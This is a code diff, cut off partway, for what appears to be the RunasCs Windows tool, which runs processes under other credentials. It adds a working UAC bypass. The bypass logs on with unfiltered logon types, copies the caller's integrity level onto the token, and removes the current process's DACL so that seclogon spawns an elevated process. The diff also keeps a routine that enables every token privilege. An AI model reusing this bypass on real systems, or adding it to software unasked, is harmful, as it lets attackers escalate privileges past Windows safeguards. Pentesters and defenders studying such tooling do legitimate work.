@@ -4,6 +4,7 @@ using System.Runtime.InteropServices;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Net.Sockets;
+using System.Security.Principal;
 
 public class RunasCsException : Exception
 {
@@ -21,14 +22,22 @@ public class RunasCs
     private const int TokenType = 1; //primary token
     private const int LOGON32_PROVIDER_DEFAULT = 0; 
     private const int LOGON32_PROVIDER_WINNT50 = 3;
+    private const int LOGON32_LOGON_INTERACTIVE = 2;
+    private const int LOGON32_LOGON_NETWORK = 3;
+    private const int LOGON32_LOGON_BATCH = 4;
+    private const int LOGON32_LOGON_SERVICE = 5;
+    private const int LOGON32_LOGON_UNLOCK = 7;
+    private const int LOGON32_LOGON_NETWORK_CLEARTEXT = 8;
+    private const int LOGON32_LOGON_NEW_CREDENTIALS = 9;
     private const int BUFFER_SIZE_PIPE = 1048576;
     private const uint CREATE_NO_WINDOW = 0x08000000;
     private const uint GENERIC_ALL = 0x10000000;
     private const uint CREATE_UNICODE_ENVIRONMENT = 0x00000400;
-    private const uint SE_PRIVILEGE_ENABLED = 0x00000002;
     private const uint DUPLICATE_SAME_ACCESS = 0x00000002;
+    private const uint DACL_SECURITY_INFORMATION = 0x00000004;
     private const UInt32 LOGON_WITH_PROFILE = 1;
     private const UInt32 LOGON_NETCREDENTIALS_ONLY = 2;
+    private const int GetCurrentProcess = -1;
 
     private IntPtr socket;
     private IntPtr hErrorWrite;
@@ -45,28 +54,6 @@ public class RunasCs
         this.hErrorWrite = new IntPtr(0);
         this.socket = new IntPtr(0);
         this.stationDaclObj = null;
-    }
-    
-    [StructLayout(LayoutKind.Sequential)]
-    private struct LUID 
-    {
-       public UInt32 LowPart;
-       public Int32 HighPart;
-    }
-    
-    [StructLayout(LayoutKind.Sequential, Pack = 4)]
-    private struct LUID_AND_ATTRIBUTES 
-    {
-       public LUID Luid;
-       public UInt32 Attributes;
-    }
-    
-    [StructLayout(LayoutKind.Sequential)]
-    private struct TOKEN_PRIVILEGES
-    {
-        public UInt32 PrivilegeCount;
-        public LUID Luid;
-        public UInt32 Attributes;
     }
     
     [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
@@ -139,6 +126,23 @@ public class RunasCs
         internal string szSystemStatus;
     }
 
+    private enum SE_OBJECT_TYPE
+    {
+        SE_UNKNOWN_OBJECT_TYPE = 0,
+        SE_FILE_OBJECT,
+        SE_SERVICE,
+        SE_PRINTER,
+        SE_REGISTRY_KEY,
+        SE_LMSHARE,
+        SE_KERNEL_OBJECT,
+        SE_WINDOW_OBJECT,
+        SE_DS_OBJECT,
+        SE_DS_OBJECT_ALL,
+        SE_PROVIDER_DEFINED_OBJECT,
+        SE_WMIGUID_OBJECT,
+        SE_REGISTRY_WOW64_32KEY
+    }
+
     [DllImport("Kernel32.dll", SetLastError=true)]
     private static extern bool CloseHandle(IntPtr handle);
     
@@ -150,12 +154,6 @@ public class RunasCs
 
     [DllImport("advapi32.dll", SetLastError = true)]
     static extern bool RevertToSelf();
-
-    [DllImport("advapi32.dll", SetLastError = true)]
-    private static extern bool AdjustTokenPrivileges(IntPtr tokenhandle, bool disableprivs, [MarshalAs(UnmanagedType.Struct)]ref TOKEN_PRIVILEGES Newstate, int bufferlength, int PreivousState, int Returnlength);
-    
-    [DllImport("advapi32.dll", SetLastError = true)]
-    private static extern int LookupPrivilegeValue(string lpsystemname, string lpname, [MarshalAs(UnmanagedType.Struct)] ref LUID lpLuid);
     
     [DllImport("advapi32.dll", SetLastError = true, BestFitMapping = false, ThrowOnUnmappableChar = true)]
     [return: MarshalAs(UnmanagedType.Bool)]
@@ -172,7 +170,12 @@ public class RunasCs
 
     [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
     private static extern bool CreateProcessWithTokenW(IntPtr hToken, int dwLogonFlags, string lpApplicationName, string lpCommandLine, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out ProcessInformation lpProcessInformation);
-    
+
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    private static extern uint SetSecurityInfo(IntPtr handle, SE_OBJECT_TYPE ObjectType, uint SecurityInfo, IntPtr psidOwner, IntPtr psidGroup, IntPtr pDacl, IntPtr pSacl);
+
+
     [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
     private static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, uint nSize);
 
@@ -196,13 +199,7 @@ public class RunasCs
     static extern bool GetUserProfileDirectory(IntPtr hToken, StringBuilder path, ref int dwSize);
 
     [DllImport("ws2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
-    internal static extern IntPtr WSASocket([In] AddressFamily addressFamily,
-                                            [In] SocketType socketType,
-                                            [In] ProtocolType protocolType,
-                                            [In] IntPtr protocolInfo,
-                                            [In] uint group,
-                                            [In] int flags
-                                            );
+    internal static extern IntPtr WSASocket([In] AddressFamily addressFamily, [In] SocketType socketType, [In] ProtocolType protocolType, [In] IntPtr protocolInfo, [In] uint group, [In] int flags);
 
     [DllImport("ws2_32.dll", SetLastError = true)]
     public static extern int connect(IntPtr s, ref SOCKADDR_IN addr, int addrsize);
@@ -225,68 +222,10 @@ public class RunasCs
     
     private static string GetProcessFunction(int createProcessFunction){
         if(createProcessFunction == 0)
-            return "CreateProcessAsUser()";
+            return "CreateProcessAsUserW()";
         if(createProcessFunction == 1)
             return "CreateProcessWithTokenW()";
         return "CreateProcessWithLogonW()";
-    }
-    
-    private static string EnablePrivilege(string privilege, IntPtr token){
-        string output = "";
-        LUID sebLuid = new LUID();
-        TOKEN_PRIVILEGES tokenp = new TOKEN_PRIVILEGES();
-        tokenp.PrivilegeCount = 1;
-        LookupPrivilegeValue(null, privilege, ref sebLuid);
-        tokenp.Luid = sebLuid;
-        tokenp.Attributes = SE_PRIVILEGE_ENABLED;
-        if(!AdjustTokenPrivileges(token, false, ref tokenp, 0, 0, 0)){
-            throw new RunasCsException("AdjustTokenPrivileges on privilege " + privilege + " failed with error code: " + Marshal.GetLastWin32Error());
-        }
-        output += "\r\nAdjustTokenPrivileges on privilege " + privilege + " succeeded";
-        return output;
-    }
-    
-    public static string EnableAllPrivileges(IntPtr token)
-    {
-        string output="";
-        output += EnablePrivilege("SeAssignPrimaryTokenPrivilege", token);
-        output += EnablePrivilege("SeAuditPrivilege", token);
-        output += EnablePrivilege("SeBackupPrivilege", token);
-        output += EnablePrivilege("SeChangeNotifyPrivilege", token);
-        output += EnablePrivilege("SeCreateGlobalPrivilege", token);
-        output += EnablePrivilege("SeCreatePagefilePrivilege", token);
-        output += EnablePrivilege("SeCreatePermanentPrivilege", token);
-        output += EnablePrivilege("SeCreateSymbolicLinkPrivilege", token);
-        output += EnablePrivilege("SeCreateTokenPrivilege", token);
-        output += EnablePrivilege("SeDebugPrivilege", token);
-        output += EnablePrivilege("SeDelegateSessionUserImpersonatePrivilege", token);
-        output += EnablePrivilege("SeEnableDelegationPrivilege", token);
-        output += EnablePrivilege("SeImpersonatePrivilege", token);
-        output += EnablePrivilege("SeIncreaseBasePriorityPrivilege", token);
-        output += EnablePrivilege("SeIncreaseQuotaPrivilege", token);
-        output += EnablePrivilege("SeIncreaseWorkingSetPrivilege", token);
-        output += EnablePrivilege("SeLoadDriverPrivilege", token);
-        output += EnablePrivilege("SeLockMemoryPrivilege", token);
-        output += EnablePrivilege("SeMachineAccountPrivilege", token);
-        output += EnablePrivilege("SeManageVolumePrivilege", token);
-        output += EnablePrivilege("SeProfileSingleProcessPrivilege", token);
-        output += EnablePrivilege("SeRelabelPrivilege", token);
-        output += EnablePrivilege("SeRemoteShutdownPrivilege", token);
-        output += EnablePrivilege("SeRestorePrivilege", token);
-        output += EnablePrivilege("SeSecurityPrivilege", token);
-        output += EnablePrivilege("SeShutdownPrivilege", token);
-        output += EnablePrivilege("SeSyncAgentPrivilege", token);
-        output += EnablePrivilege("SeSystemEnvironmentPrivilege", token);
-        output += EnablePrivilege("SeSystemProfilePrivilege", token);
-        output += EnablePrivilege("SeSystemtimePrivilege", token);
-        output += EnablePrivilege("SeTakeOwnershipPrivilege", token);
-        output += EnablePrivilege("SeTcbPrivilege", token);
-        output += EnablePrivilege("SeTimeZonePrivilege", token);
-        output += EnablePrivilege("SeTrustedCredManAccessPrivilege", token);
-        output += EnablePrivilege("SeUndockPrivilege", token);
-        output += EnablePrivilege("SeUnsolicitedInputPrivilege", token);
-        output += EnablePrivilege("SeIncreaseQuotaPrivilege", token);
-        return output;
     }
     
     private static bool CreateAnonymousPipeEveryoneAccess(ref IntPtr hReadPipe, ref IntPtr hWritePipe)
@@ -359,10 +298,7 @@ public class RunasCs
                 break;
             int stringLen = (str.Length + 1 /* char \0 */) * sizeof(char);
             count = count + stringLen;
-            if(IntPtr.Size == 8)
-                unicodeStrIntPtr = new IntPtr(unicodeStrIntPtr.ToInt64() + stringLen);
-            else
-                unicodeStrIntPtr = new IntPtr(unicodeStrIntPtr.ToInt32() + stringLen);
+            unicodeStrIntPtr = new IntPtr(unicodeStrIntPtr.ToInt64() + stringLen);
         }
         return count;
     }
@@ -379,10 +315,18 @@ public class RunasCs
             return false;
         }
 
-        success = CreateEnvironmentBlock(out lpEnvironment, hToken, false);
-        if(success == false)
+        try
         {
-            warning = "[*] Warning: lpEnvironment failed with error code: " + Marshal.GetLastWin32Error() + ".\n";
+            success = CreateEnvironmentBlock(out lpEnvironment, hToken, false);
+            if (success == false)
+            {
+                warning = "[*] Warning: CreateEnvironmentBlock failed with error code: " + Marshal.GetLastWin32Error();
+                RevertToSelf();
+                return false;
+            }
+        }
+        catch {
+            warning = "[*] Warning: CreateEnvironmentBlock failed with error code: " + Marshal.GetLastWin32Error();
             RevertToSelf();
             return false;
         }
@@ -437,6 +381,34 @@ public class RunasCs
         return true;
     }
 
+    // UAC bypass discussed in this UAC quiz tweet --> https://twitter.com/splinter_code/status/1458054161472307204
+    // thanks @winlogon0 for the implementation --> https://github.com/AltF5/MediumToHighIL_Test/blob/main/TestCode2.cs
+    private bool CreateProcessWithLogonWUacBypass(int logonType, string username, string domainName, string password, string processPath, string commandLine, ref STARTUPINFO startupInfo, out ProcessInformation processInfo) {
+        bool result = false;
+        IntPtr hToken = new IntPtr(0);
+        // the below logon types are not filtered by UAC, we allow login with them. Otherwise stick with NetworkCleartext
+        if (logonType == LOGON32_LOGON_NETWORK || logonType == LOGON32_LOGON_BATCH || logonType == LOGON32_LOGON_SERVICE || logonType == LOGON32_LOGON_NETWORK_CLEARTEXT)
+            result = LogonUser(username, domainName, password, logonType, LOGON32_PROVIDER_DEFAULT, ref hToken);
+        else
+            result = LogonUser(username, domainName, password, LOGON32_LOGON_NETWORK_CLEARTEXT, LOGON32_PROVIDER_DEFAULT, ref hToken);
+        if (result == false)
+            throw new RunasCsException("CreateProcessWithLogonWUacBypass: Wrong Credentials. LogonUser failed with error code: " + Marshal.GetLastWin32Error());
+
+        // here we set the IL of the new token equal to our current process IL. Needed or seclogon will fail.
+        AccessToken.SetTokenIntegrityLevel(hToken, AccessToken.GetTokenIntegrityLevel(WindowsIdentity.GetCurrent().Token));
+        // remove acl to our current process. Needed for seclogon
+        SetSecurityInfo((IntPtr)GetCurrentProcess, SE_OBJECT_TYPE.SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
+
+        using (WindowsImpersonationContext impersonatedUser = WindowsIdentity.Impersonate(hToken))
+        {
+            if (domainName == "") // fixing bugs in seclogon ...
+                domainName = ".";
+            result = CreateProcessWithLogonW(username, domainName, password, LOGON_NETCREDENTIALS_ONLY, processPath, commandLine, CREATE_NO_WINDOW, (UInt32)0, null, ref startupInfo, out processInfo);
+        }
+        CloseHandle(hToken);
+        return result;
+    }
+
     public void CleanupHandles()
     {
         if(this.hOutputReadTmp != IntPtr.Zero) CloseHandle(this.hOutputReadTmp);
@@ -453,10 +425,10 @@ public class RunasCs
         this.stationDaclObj = null;
     }
 
-    public string RunAs(string username, string password, string cmd, string domainName, uint processTimeout, int logonType, int createProcessFunction, string[] remote, bool createUserProfile)
+    public string RunAs(string username, string password, string cmd, string domainName, uint processTimeout, int logonType, int createProcessFunction, string[] remote, bool createUserProfile, bool bypassUac)
     /*
         int createProcessFunction:
-            0: CreateProcessAsUser();
+            0: CreateProcessAsUserW();
             1: CreateProcessWithTokenW();
             2: CreateProcessWithLogonW();
     */
@@ -489,8 +461,9 @@ public class RunasCs
             if(!DuplicateHandle(hCurrentProcess, this.hOutputReadTmp, hCurrentProcess, out this.hOutputRead, 0, false, DUPLICATE_SAME_ACCESS)) {
                 throw new RunasCsException("DuplicateHandle stdout read pipe failed with error code: " + Marshal.GetLastWin32Error());
             }
-
             CloseHandle(this.hOutputReadTmp);
+            this.hOutputReadTmp = IntPtr.Zero;
+
             UInt32 PIPE_NOWAIT = 0x00000001;
             if(!SetNamedPipeHandleState(this.hOutputRead, ref PIPE_NOWAIT, IntPtr.Zero, IntPtr.Zero)) {
                 throw new RunasCsException("SetNamedPipeHandleState failed with error code: " + Marshal.GetLastWin32Error());
@@ -510,79 +483,114 @@ public class RunasCs
             startupInfo.hStdError = this.socket;
         }
 
-        desktopName = this.stationDaclObj.AddAclToActiveWindowStation(domainName, username);        
+        desktopName = this.stationDaclObj.AddAclToActiveWindowStation(domainName, username, logonType);        
         startupInfo.lpDesktop = desktopName;
 
         if(createProcessFunction == 2){
-
-            if(logonType == 9){
-                if(domainName == "")
-                    throw new RunasCsException("You must provide a domain name when using logon type 9 with CreateProcessWithLogonW.");
-                success = CreateProcessWithLogonW(username, domainName, password, LOGON_NETCREDENTIALS_ONLY, processPath, commandLine, CREATE_NO_WINDOW, (UInt32) 0, null, ref startupInfo, out processInfo);
+            if (logonType != LOGON32_LOGON_INTERACTIVE && logonType != LOGON32_LOGON_NEW_CREDENTIALS && !bypassUac) {
+                Console.Out.WriteLine("[*] Warning: Using function CreateProcessWithLogonW is not compatible with logon type " + logonType.ToString() + ". Reverting to logon type Interactive (2)...");
+                Console.Out.Flush();
             }
-            else
-                success = CreateProcessWithLogonW(username, domainName, password, (UInt32)logonFlags, processPath, commandLine, CREATE_NO_WINDOW, (UInt32) 0, null, ref startupInfo, out processInfo);
-            if (success == false){
-                throw new RunasCsException("CreateProcessWithLogonW failed with " + Marshal.GetLastWin32Error());
+            if (logonType == LOGON32_LOGON_NEW_CREDENTIALS)
+            {
+                if (domainName == "")
+                    domainName = ".";
+                success = CreateProcessWithLogonW(username, domainName, password, LOGON_NETCREDENTIALS_ONLY, processPath, commandLine, CREATE_NO_WINDOW, (UInt32)0, null, ref startupInfo, out processInfo);
+                if (success == false)
+                    throw new RunasCsException("CreateProcessWithLogonW logon type 9 failed with " + Marshal.GetLastWin32Error());
             }
-
+            else {
+                IntPtr hTokenUacCheck = new IntPtr(0);
+                // we use the logon type 2 - Interactive because CreateProcessWithLogonW internally use this logon type for the logon 
+                success = LogonUser(username, domainName, password, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, ref hTokenUacCheck);
+                if (success == false)
+                    throw new RunasCsException("Wrong Credentials. LogonUser failed with error code: " + Marshal.GetLastWin32Error());
+                if (AccessToken.IsLimitedUACToken(hTokenUacCheck)) {
+                    if (bypassUac){
+                        success = CreateProcessWithLogonWUacBypass(logonType, username, domainName, password, processPath, commandLine, ref startupInfo, out processInfo);
+                        if (success == false)
+                            throw new RunasCsException("CreateProcessWithLogonWUacBypass failed with " + Marshal.GetLastWin32Error());
+                    }
+                    else {
+                        if (logonType == LOGON32_LOGON_INTERACTIVE || logonType == 11 /*CachedInteractive*/) { // only these logon types are filtered by UAC
+                            Console.Out.WriteLine(String.Format("[*] Warning: Token retrieved for user '{0}' is limited by UAC. Use the flag -b to try a UAC bypass or use the NetworkCleartext (8) in --logon-type.", username));
+                            Console.Out.Flush();
+                        }
+                        success = CreateProcessWithLogonW(username, domainName, password, (UInt32)logonFlags, processPath, commandLine, CREATE_NO_WINDOW, (UInt32)0, null, ref startupInfo, out processInfo);
+                        if (success == false)
+                            throw new RunasCsException("CreateProcessWithLogonW logon type 2 failed with " + Marshal.GetLastWin32Error());
+                    }
+                }
+                CloseHandle(hTokenUacCheck);
+            }
         } else {
-
             IntPtr hToken = new IntPtr(0);
             IntPtr hTokenDuplicate = new IntPtr(0);
-            if(logonType == 9)
+            if(logonType == LOGON32_LOGON_NEW_CREDENTIALS)
                 success = LogonUser(username, domainName, password, logonType, LOGON32_PROVIDER_WINNT50, ref hToken);
             else
                 success = LogonUser(username, domainName, password, logonType, LOGON32_PROVIDER_DEFAULT, ref hToken);
             if(success == false)
-            {
                 throw new RunasCsException("Wrong Credentials. LogonUser failed with error code: " + Marshal.GetLastWin32Error());
-            }
 
             SECURITY_ATTRIBUTES sa  = new SECURITY_ATTRIBUTES();
             sa.bInheritHandle       = true;
             sa.Length               = Marshal.SizeOf(sa);
             sa.lpSecurityDescriptor = (IntPtr)0;
-
             success = DuplicateTokenEx(hToken, GENERIC_ALL, ref sa, SECURITY_IMPERSONATION_LEVEL.SecurityDelegation, TokenType, ref hTokenDuplicate);
             if(success == false)
-            {
                 throw new RunasCsException("DuplicateTokenEx failed with error code: " + Marshal.GetLastWin32Error());
-            }
 
-            // obtain environmentBlock for desired user
-            string warning;
-            IntPtr lpEnvironment;
-            success = getUserEnvironmentBlock(hTokenDuplicate, out lpEnvironment, out warning);
-            if(success == false) {
-                Console.Out.WriteLine(warning);
-                Console.Out.WriteLine(String.Format("[*] Warning: Unable to obtain environment for user '{0}'.", username));
-                Console.Out.WriteLine(String.Format("[*] Warning: Environment of created process might be incorrect.", username));
-            }
-
-            //enable all privileges assigned to the token
-            if(logonType != 3 && logonType != 8)
-                EnableAllPrivileges(hTokenDuplicate);
-                
-            if(createProcessFunction == 0){
-                //the inherit handle flag must be true otherwise the pipe handles won't be inherited and the output won't be retrieved
-                success = CreateProcessAsUser(hTokenDuplicate, processPath, commandLine, IntPtr.Zero, IntPtr.Zero, true, CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT, lpEnvironment, Environment.GetEnvironmentVariable("SystemRoot") + "\\System32", ref startupInfo, out processInfo);
-                if(success == false)
+            if (AccessToken.IsLimitedUACToken(hTokenDuplicate))
+            {
+                if (bypassUac)
                 {
-                    throw new RunasCsException("CreateProcessAsUser failed with error code : " + Marshal.GetLastWin32Error());
+                    success = CreateProcessWithLogonWUacBypass(logonType, username, domainName, password, processPath, commandLine, ref startupInfo, out processInfo);
+                    if (success == false)
+                        throw new RunasCsException("CreateProcessWithLogonWUacBypass failed with " + Marshal.GetLastWin32Error());
                 }
-
-            } else if(createProcessFunction == 1){
-
-                success = CreateProcessWithTokenW(hTokenDuplicate, logonFlags, processPath, commandLine, CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT, lpEnvironment, null, ref startupInfo, out processInfo);
-                if(success == false)
+                else
                 {
-                    throw new RunasCsException("CreateProcessWithTokenW failed with error code: " + Marshal.GetLastWin32Error());
+                    if (logonType == LOGON32_LOGON_INTERACTIVE || logonType == 11 /*CachedInteractive*/){ // only these logon types are filtered by UAC
+                        Console.Out.WriteLine(String.Format("[*] Warning: Token retrieved for user '{0}' is limited by UAC. Use the flag -b to try a UAC bypass or use the NetworkCleartext (8) in --logon-type.", username));
+                        Console.Out.Flush();
+                    }
                 }
             }
+            else
+                bypassUac = false; // we reset this flag as it's not considered when token is not limited
 
-            if( lpEnvironment != IntPtr.Zero ) {
-                DestroyEnvironmentBlock(lpEnvironment);
+            if (!bypassUac) {
+                string warning;
+                IntPtr lpEnvironment;
+                // obtain environmentBlock for desired user
+                success = getUserEnvironmentBlock(hTokenDuplicate, out lpEnvironment, out warning);
+                if (success == false)
+                {
+                    //Console.Out.WriteLine(warning); // this is a debug message
+                    Console.Out.WriteLine(String.Format("[*] Warning: Unable to obtain environment for user '{0}'. Environment variables of created process might be incorrect.", username));
+                    Console.Out.Flush();
+                }
+
+                // enable all privileges assigned to the token
+                if (logonType != LOGON32_LOGON_NETWORK && logonType != LOGON32_LOGON_NETWORK_CLEARTEXT)
+                    AccessToken.EnableAllPrivileges(hTokenDuplicate);
+
+                if (createProcessFunction == 0)
+                {
+                    //the inherit handle flag must be true otherwise the pipe handles won't be inherited and the output won't be retrieved
+                    success = CreateProcessAsUser(hTokenDuplicate, processPath, commandLine, IntPtr.Zero, IntPtr.Zero, true, CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT, lpEnvironment, Environment.GetEnvironmentVariable("SystemRoot") + "\\System32", ref startupInfo, out processInfo);
+                    if (success == false)
+                        throw new RunasCsException("CreateProcessAsUser failed with error code : " + Marshal.GetLastWin32Error());
+                }
+                else if (createProcessFunction == 1)
+                {
+                    success = CreateProcessWithTokenW(hTokenDuplicate, logonFlags, processPath, commandLine, CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT, lpEnvironment, null, ref startupInfo, out processInfo);
+                    if (success == false)
+                        throw new RunasCsException("CreateProcessWithTokenW failed with error code: " + Marshal.GetLastWin32Error());
+                }
+
+                if (lpEnvironment != IntPtr.Zero) DestroyEnvironmentBlock(lpEnvironment);
             }
             CloseHandle(hToken);
             CloseHandle(hTokenDuplicate);
@@ -591,9 +599,10 @@ public class RunasCs
         if(processTimeout > 0) {
             CloseHandle(this.hOutputWrite);
             CloseHandle(this.hErrorWrite);
+            this.hOutputWrite = IntPtr.Zero;
+            this.hErrorWrite = IntPtr.Zero;
             WaitForSingleObject(processInfo.process, processTimeout);
             output += ReadOutputFromPipe(this.hOutputRead);
-
         } else {
             output += "[+] Running in session " + sessionId.ToString() + " with process function " + GetProcessFunction(createProcessFunction) + "\r\n";
             output += "[+] Using Station\\Desktop: " + desktopName + "\r\n";
@@ -610,7 +619,6 @@ public class RunasCs
 public class WindowStationDACL{
    
     private const int UOI_NAME = 2;
-    private const int SECURITY_WORLD_RID = 0;
     private const int ERROR_INSUFFICIENT_BUFFER = 122;
     private const uint SECURITY_DESCRIPTOR_REVISION = 1;
     private const uint ACL_REVISION = 2;
@@ -1118,7 +1126,7 @@ public class WindowStationDACL{
     }
     
 
-    public string AddAclToActiveWindowStation(string domain, string username){
+    public string AddAclToActiveWindowStation(string domain, string username, int logonType){
         string lpDesktop = "";
         byte[] stationNameBytes = new byte[256];
         string stationName = "";
@@ -1133,32 +1141,35 @@ public class WindowStationDACL{
         }
         stationName = Encoding.Default.GetString(stationNameBytes).Substring(0, (int)lengthNeeded-1);
 
-        this.hWinsta = OpenWindowStation(stationName, false, ACCESS_MASK.READ_CONTROL | ACCESS_MASK.WRITE_DAC);
-        if(this.hWinsta == IntPtr.Zero)
+        // this should be avoided with the LOGON32_LOGON_NEW_CREDENTIALS logon type or some bug can happen in LookupAccountName()
+        if (logonType != 9)
         {
-            throw new RunasCsException("OpenWindowStation failed with error code " + Marshal.GetLastWin32Error());
-        }
-        
-        if(!SetProcessWindowStation(this.hWinsta))
-        {
-            throw new RunasCsException("SetProcessWindowStation hWinsta failed with error code " + Marshal.GetLastWin32Error());
-        }
+            this.hWinsta = OpenWindowStation(stationName, false, ACCESS_MASK.READ_CONTROL | ACCESS_MASK.WRITE_DAC);
+            if (this.hWinsta == IntPtr.Zero)
+            {
+                throw new RunasCsException("OpenWindowStation failed with error code " + Marshal.GetLastWin32Error());
+            }
 
-        this.hDesktop = OpenDesktop("Default", 0, false, ACCESS_MASK.READ_CONTROL | ACCESS_MASK.WRITE_DAC | ACCESS_MASK.DESKTOP_WRITEOBJECTS | ACCESS_MASK.DESKTOP_READOBJECTS);
-        if(!SetProcessWindowStation(hWinstaSave))
-        {
-            throw new RunasCsException("SetProcessWindowStation hWinstaSave failed with error code " + Marshal.GetLastWin32Error());
+            if (!SetProcessWindowStation(this.hWinsta))
+            {
+                throw new RunasCsException("SetProcessWindowStation hWinsta failed with error code " + Marshal.GetLastWin32Error());
+            }
+
+            this.hDesktop = OpenDesktop("Default", 0, false, ACCESS_MASK.READ_CONTROL | ACCESS_MASK.WRITE_DAC | ACCESS_MASK.DESKTOP_WRITEOBJECTS | ACCESS_MASK.DESKTOP_READOBJECTS);
+            if (!SetProcessWindowStation(hWinstaSave))
+            {
+                throw new RunasCsException("SetProcessWindowStation hWinstaSave failed with error code " + Marshal.GetLastWin32Error());
+            }
+
+            if (this.hWinsta == IntPtr.Zero)
+            {
+                throw new RunasCsException("OpenDesktop failed with error code " + Marshal.GetLastWin32Error());
+            }
+
+            this.userSid = GetUserSid(domain, username);
+            AddAceToWindowStation();
+            AddAceToDesktop();
         }
-
-        if(this.hWinsta == IntPtr.Zero)
-        {
-            throw new RunasCsException("OpenDesktop failed with error code " + Marshal.GetLastWin32Error());
-        }
-
-        this.userSid = GetUserSid(domain, username);
-
-        AddAceToWindowStation();
-        AddAceToDesktop();
 
         lpDesktop = stationName + "\\Default";
         return lpDesktop;
@@ -1172,17 +1183,48 @@ public class WindowStationDACL{
     }
 }
 
+public static class AccessToken{
 
-public static class Token{
-        
+    // Mandatory Label SIDs (integrity levels)
+    private const int SECURITY_MANDATORY_UNTRUSTED_RID = 0;
+    private const int SECURITY_MANDATORY_LOW_RID = 0x1000;
+    private const int SECURITY_MANDATORY_MEDIUM_RID = 0x2000;
+    private const int SECURITY_MANDATORY_HIGH_RID = 0x3000;
+    private const int SECURITY_MANDATORY_SYSTEM_RID = 0x4000;
+    private const int SECURITY_MANDATORY_PROTECTED_PROCESS_RID = 0x5000;
+    private const uint SE_PRIVILEGE_ENABLED = 0x00000002;
+    private static readonly byte[] MANDATORY_LABEL_AUTHORITY = new byte[] { 0, 0, 0, 0, 0, 16 };
+
     [DllImport("advapi32.dll", SetLastError=true)]
-    private static extern bool GetTokenInformation(IntPtr TokenHandle,TOKEN_INFORMATION_CLASS TokenInformationClass,IntPtr TokenInformation,uint TokenInformationLength,out uint ReturnLength);
+    private static extern bool GetTokenInformation(IntPtr TokenHandle,TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation,uint TokenInformationLength,out uint ReturnLength);
     
     [DllImport("advapi32.dll", SetLastError = true, CharSet=CharSet.Unicode)]
     [return: MarshalAs(UnmanagedType.Bool)]
     private static extern bool LookupPrivilegeName(string lpSystemName, IntPtr lpLuid, StringBuilder lpName, ref int cchName );
-        
-    enum TOKEN_INFORMATION_CLASS{
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    private static extern bool GetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    private static extern bool AllocateAndInitializeSid(IntPtr pIdentifierAuthority, byte nSubAuthorityCount, int dwSubAuthority0, int dwSubAuthority1, int dwSubAuthority2, int dwSubAuthority3, int dwSubAuthority4, int dwSubAuthority5,  int dwSubAuthority6, int dwSubAuthority7, out IntPtr pSid);
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    private static extern bool SetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength);
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    private static extern IntPtr GetSidSubAuthority(IntPtr sid, UInt32 subAuthorityIndex);
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    private static extern IntPtr GetSidSubAuthorityCount(IntPtr sid);
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    private static extern bool AdjustTokenPrivileges(IntPtr tokenhandle, bool disableprivs, [MarshalAs(UnmanagedType.Struct)] ref TOKEN_PRIVILEGES_2 Newstate, int bufferlength, int PreivousState, int Returnlength);
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    private static extern int LookupPrivilegeValue(string lpsystemname, string lpname, [MarshalAs(UnmanagedType.Struct)] ref LUID lpLuid);
+
+    public enum TOKEN_INFORMATION_CLASS
+    {
         TokenUser = 1,
         TokenGroups,
         TokenPrivileges,
@@ -1199,15 +1241,81 @@ public static class Token{
         TokenSessionReference,
         TokenSandBoxInert,
         TokenAuditPolicy,
-        TokenOrigin
+        TokenOrigin,
+        TokenElevationType,
+        TokenLinkedToken,
+        TokenElevation,
+        TokenHasRestrictions,
+        TokenAccessInformation,
+        TokenVirtualizationAllowed,
+        TokenVirtualizationEnabled,
+        TokenIntegrityLevel,
+        TokenUIAccess,
+        TokenMandatoryPolicy,
+        TokenLogonSid,
+        TokenIsAppContainer,
+        TokenCapabilities,
+        TokenAppContainerSid,
+        TokenAppContainerNumber,
+        TokenUserClaimAttributes,
+        TokenDeviceClaimAttributes,
+        TokenRestrictedUserClaimAttributes,
+        TokenRestrictedDeviceClaimAttributes,
+        TokenDeviceGroups,
+        TokenRestrictedDeviceGroups,
+        TokenSecurityAttributes,
+        TokenIsRestricted,
+        TokenProcessTrustLevel,
+        TokenPrivateNameSpace,
+        TokenSingletonAttributes,
+        TokenBnoIsolation,
+        TokenChildProcessFlags,
+        TokenIsLessPrivilegedAppContainer,
+        TokenIsSandboxed,
+        TokenIsAppSilo,
+        MaxTokenInfoClass
     }
-    
+
+    public enum IntegrityLevel : int
+    {
+        Same = -2,
+        Unknown = -1,
+        Untrusted = SECURITY_MANDATORY_UNTRUSTED_RID,
+        Low = SECURITY_MANDATORY_LOW_RID,
+        Medium = SECURITY_MANDATORY_MEDIUM_RID,
+        High = SECURITY_MANDATORY_HIGH_RID,
+        System = SECURITY_MANDATORY_SYSTEM_RID,
+        ProtectedProcess = SECURITY_MANDATORY_PROTECTED_PROCESS_RID
+    }
+
+    public enum TokenGroupAttributes : uint
+    {
